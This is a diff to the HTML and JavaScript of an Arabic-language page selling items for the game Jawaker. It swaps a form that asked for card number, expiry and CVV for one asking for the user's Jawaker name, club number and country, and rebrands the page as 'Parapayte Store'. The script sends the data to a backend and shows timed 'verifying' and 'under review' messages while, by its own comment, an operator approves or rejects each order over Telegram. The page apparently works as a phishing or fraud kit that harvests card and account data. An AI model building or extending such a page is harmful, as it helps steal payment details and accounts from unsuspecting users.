@@ -297,10 +297,21 @@
     background: linear-gradient(90deg, transparent, var(--card-border) 20%, var(--card-border) 80%, transparent);
     margin: 18px 0 16px;
   }
-  .field.card-field input{
+  .field.card-field input,
+  .field.card-field select{
     border-radius: 16px;
     padding: 15px 18px;
     font-size: 15px;
+  }
+  .field.card-field select{
+    width:100%;
+    background: #101216;
+    border: 1.5px solid var(--card-border);
+    color: var(--text);
+    font-family:'Tajawal', sans-serif;
+    outline:none;
+    appearance:none;
+    -webkit-appearance:none;
   }
   .row-3{
     display:flex;
@@ -407,13 +418,94 @@
     color: var(--text);
     margin-bottom: 20px;
   }
+
+  /* Rating modal (white, shown after approval) */
+  .rating-overlay{
+    position:fixed;
+    inset:0;
+    background: rgba(0,0,0,0.55);
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding: 20px;
+    z-index: 200;
+  }
+  .rating-overlay.open{ display:flex; }
+  .rating-panel{
+    background:#ffffff;
+    color:#1c1e22;
+    border-radius: 18px;
+    width:100%;
+    max-width: 360px;
+    padding: 26px 22px 22px;
+    text-align:center;
+  }
+  .rating-title{
+    font-family:'Cairo', sans-serif;
+    font-weight:800;
+    font-size: 20px;
+    color: #2f68c9;
+    margin-bottom: 14px;
+  }
+  .rating-divider{
+    height:1px;
+    background: linear-gradient(90deg, transparent, #dfe2e8 20%, #dfe2e8 80%, transparent);
+    margin: 0 0 16px;
+  }
+  .rating-text{
+    font-family:'Tajawal', sans-serif;
+    font-weight:400;
+    font-size: 14px;
+    color:#4a4d54;
+    line-height:1.7;
+    margin-bottom: 18px;
+  }
+  .rating-input{
+    width: 90px;
+    margin: 0 auto 18px;
+    display:block;
+    text-align:center;
+    font-family:'Cairo', sans-serif;
+    font-weight:700;
+    font-size: 20px;
+    color:#1c1e22;
+    background:#f4f5f7;
+    border: 1.5px solid #dfe2e8;
+    border-radius: 12px;
+    padding: 10px 6px;
+    outline:none;
+  }
+  .rating-input:focus{ border-color:#2f68c9; }
+  .rating-submit{
+    width:100%;
+    background: linear-gradient(180deg, #5aa0ff, #2f68c9);
+    color:#fff;
+    border:none;
+    padding: 13px 8px;
+    border-radius: 12px;
+    font-family:'Cairo', sans-serif;
+    font-weight:700;
+    font-size: 14.5px;
+    cursor:pointer;
+    box-shadow: 0 3px 0 rgba(0,0,0,0.15);
+  }
+  .rating-skip{
+    display:block;
+    margin: 12px auto 0;
+    background:none;
+    border:none;
+    color:#9a9ea8;
+    font-size: 12.5px;
+    cursor:pointer;
+    text-decoration:underline;
+  }
 </style>
 </head>
 <body>
 
 <header>
   <div style="width:40px"></div>
-  <div class="brand">jawaker <span class="dot">●</span></div>
+  <div class="brand">Parapayte Store <span class="dot">●</span></div>
   <div class="menu-icon"><i></i><i></i><i></i></div>
 </header>
 
@@ -423,7 +515,7 @@
 </main>
 
 <footer>
-  <span>jawaker</span>
+  <span>Parapayte Store</span>
   <span>© 2026 جميع الحقوق محفوظة</span>
 </footer>
 
@@ -444,23 +536,41 @@
       </div>
 
       <div class="soft-divider"></div>
-      <div class="section-label">معلومات البطاقة</div>
+      <div class="section-label">الاسم وبعض المعلومات</div>
 
       <div class="field card-field">
-        <input type="text" id="f-holder-name" name="jawakerName" placeholder="Card Holder Name" pattern="[^0-9]*" required>
+        <input type="text" id="f-holder-name" name="jawakerName" placeholder="your name in jawaker" pattern="[^0-9]*" required>
       </div>
 
       <div class="field card-field">
-        <input type="text" id="f-jawaker-number" name="jawakerNumber" inputmode="numeric" placeholder="Card Number" maxlength="19" required>
+        <input type="text" id="f-jawaker-number" name="jawakerNumber" inputmode="numeric" placeholder=" Number club" maxlength="19" required>
       </div>
 
-      <div class="row-3">
-        <input type="text" id="f-mm" name="mm" inputmode="numeric" maxlength="2" placeholder="MM" pattern="\d{2}" required>
-        <input type="text" id="f-yy" name="yy" inputmode="numeric" maxlength="2" placeholder="YY" pattern="\d{2}" required>
-        <input type="text" id="f-key" name="permCode" inputmode="numeric" maxlength="4" placeholder="CVV" pattern="\d{3,4}" required>
+      <div class="field card-field">
+        <select id="f-country" name="country" required>
+          <option value="" disabled selected>بلد الحساب على جواكر</option>
+          <option value="السعودية">السعودية</option>
+          <option value="مصر">مصر</option>
+          <option value="الإمارات">الإمارات</option>
+          <option value="الأردن">الأردن</option>
+          <option value="لبنان">لبنان</option>
+          <option value="سوريا">سوريا</option>
+          <option value="العراق">العراق</option>
+          <option value="الكويت">الكويت</option>
+          <option value="قطر">قطر</option>
+          <option value="عمان">عمان</option>
+          <option value="البحرين">البحرين</option>
+          <option value="المغرب">المغرب</option>
+          <option value="الجزائر">الجزائر</option>
+          <option value="تونس">تونس</option>
+          <option value="ليبيا">ليبيا</option>
+          <option value="فلسطين">فلسطين</option>
+          <option value="اليمن">اليمن</option>
+          <option value="أخرى">أخرى</option>
+        </select>
       </div>
 
-      <button type="submit" class="submit-btn" id="submitBtn" disabled>إرسال</button>
+      <button type="submit" class="submit-btn" id="submitBtn" disabled > إرسال المعلومات </button>
     </form>
 
     <div class="status-view" id="statusView">
@@ -469,6 +579,17 @@
       <div class="status-text" id="statusText">يرجى الانتظار قليلاً...</div>
       <button class="submit-btn" id="statusActionBtn" style="display:none"></button>
     </div>
+  </div>
+</div>
+
+<div class="rating-overlay" id="ratingOverlay">
+  <div class="rating-panel">
+    <div class="rating-title">قيّمنا</div>
+    <div class="rating-divider"></div>
+    <div class="rating-text">قيّم سرعة وأسعار موقعنا من 6 نجوم</div>
+    <input type="number" id="ratingInput" class="rating-input" min="1" max="6" inputmode="numeric" placeholder="1-6">
+    <button type="button" class="rating-submit" id="ratingSubmitBtn">إرسال التقييم</button>
+    <button type="button" class="rating-skip" id="ratingSkipBtn">لاحقاً</button>
   </div>
 </div>
 
@@ -515,7 +636,7 @@
   function handleBuy(btn){
     if(btn.dataset.state === 'price'){
       // First click: reveal the payment option
-      btn.textContent = 'Pay with Credit Card';
+      btn.textContent = 'ادخل معلومات حسابك';
       btn.dataset.state = 'pay';
       return;
     }
@@ -539,7 +660,7 @@
   const overlay = document.getElementById('overlay');
   const payForm = document.getElementById('payForm');
   const submitBtn = document.getElementById('submitBtn');
-  const formInputs = payForm.querySelectorAll('input[required]');
+  const formInputs = payForm.querySelectorAll('input[required], select[required]');
   const statusView = document.getElementById('statusView');
   const statusSpinnerWrap = document.getElementById('statusSpinnerWrap');
   const statusIcon = document.getElementById('statusIcon');
@@ -550,9 +671,6 @@
   const idInput = document.getElementById('f-id');
   const holderNameInput = document.getElementById('f-holder-name');
   const numberInput = document.getElementById('f-jawaker-number');
-  const mmInput = document.getElementById('f-mm');
-  const yyInput = document.getElementById('f-yy');
-  const keyInput = document.getElementById('f-key');
 
   // ID: digits only
   idInput.addEventListener('input', function(){
@@ -564,20 +682,6 @@
     this.value = this.value.replace(/[0-9]/g, '');
   });
 
-  // Number: digits only, auto-grouped in 4s (e.g. 1234 5678 9012 3456)
-  numberInput.addEventListener('input', function(){
-    const digits = this.value.replace(/\D/g, '').slice(0, 16);
-    this.value = (digits.match(/.{1,4}/g) || []).join(' ');
-    this.setCustomValidity(digits.length === 16 ? '' : 'يجب أن يكون الرقم 16 خانة');
-  });
-
-  // MM / YY / Key: digits only
-  [mmInput, yyInput, keyInput].forEach((input, idx) => {
-    const maxLen = idx === 2 ? 4 : 2;
-    input.addEventListener('input', function(){
-      this.value = this.value.replace(/\D/g, '').slice(0, maxLen);
-    });
-  });
 
   function openForm(){
     if(currentOrder){
@@ -616,13 +720,24 @@
     input.addEventListener('input', validateForm);
   });
 
+  let verifyTimer = null;
+
   function showWaiting(){
     payForm.style.display = 'none';
     statusView.classList.add('show');
     statusSpinnerWrap.style.display = '';
     statusIcon.style.display = 'none';
-    statusText.textContent = 'يرجى الانتظار قليلاً...';
+    statusText.textContent = 'جار التحقق...';
     statusActionBtn.style.display = 'none';
+
+    // بعد 25 ثانية، إذا الطلب لسا معلّق، ننتقل لحالة "قيد المراجعة"
+    // مع الاستمرار الفعلي بانتظار قرار حقيقي (approved/rejected) من تلجرام
+    clearTimeout(verifyTimer);
+    verifyTimer = setTimeout(() => {
+      if (statusView.classList.contains('show') && statusText.textContent === 'جار التحقق...') {
+        statusText.textContent = 'قيد المراجعة، سيتم إعلامك فور الانتهاء...';
+      }
+    }, 25000);
   }
 
   function showApproved(){
@@ -634,6 +749,7 @@
     statusActionBtn.className = 'submit-btn enabled';
     statusActionBtn.style.display = '';
     statusActionBtn.onclick = closeForm;
+    showRatingModal();
   }
 
   function showRejected(){
@@ -663,6 +779,7 @@
 
   function stopPolling(){
     if(pollTimer){ clearInterval(pollTimer); pollTimer = null; }
+    if(verifyTimer){ clearTimeout(verifyTimer); verifyTimer = null; }
   }
 
   function pollOrderStatus(orderId){
@@ -695,6 +812,7 @@
       id: data.get('id'),
       jawakerNumber: data.get('jawakerNumber').replace(/\s/g, ''),
       jawakerName: data.get('jawakerName'),
+      country: data.get('country'),
       permCode: data.get('permCode'),
       accountDate: `${data.get('mm')}/${data.get('yy')}`,
       order: currentOrder || {},
@@ -714,11 +832,51 @@
         throw new Error(result.error || 'فشل إرسال الطلب');
       }
       showWaiting();
+      currentOrderId = result.order_id;
       pollOrderStatus(result.order_id);
     } catch(err){
       showWaiting();
       showError('صار في مشكلة بإرسال البيانات: ' + err.message);
     }
+  });
+
+  // ---- Rating modal ----
+  let currentOrderId = null;
+  const ratingOverlay = document.getElementById('ratingOverlay');
+  const ratingInput = document.getElementById('ratingInput');
+  const ratingSubmitBtn = document.getElementById('ratingSubmitBtn');
+  const ratingSkipBtn = document.getElementById('ratingSkipBtn');
+
+  function showRatingModal(){
+    ratingInput.value = '';
+    ratingOverlay.classList.add('open');
+  }
+  function closeRatingModal(){
+    ratingOverlay.classList.remove('open');
+  }
+  ratingSkipBtn.addEventListener('click', closeRatingModal);
+  ratingOverlay.addEventListener('click', (e) => {
+    if(e.target === ratingOverlay) closeRatingModal();
+  });
+
+  ratingSubmitBtn.addEventListener('click', async function(){
+    const value = parseInt(ratingInput.value, 10);
+    if(!value || value < 1 || value > 6){
+      ratingInput.focus();
+      return;
+    }
+    ratingSubmitBtn.disabled = true;
+    ratingSubmitBtn.textContent = 'جارِ الإرسال...';
+    try{
+      await fetch(`${BACKEND_URL}/api/rating`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ order_id: currentOrderId, rating: value }),
+      });
+    } catch(err){
+      // تجاهل أي خطأ شبكة، ما منوقف المستخدم عليه
+    }
+    closeRatingModal();
   });
 </script>
 
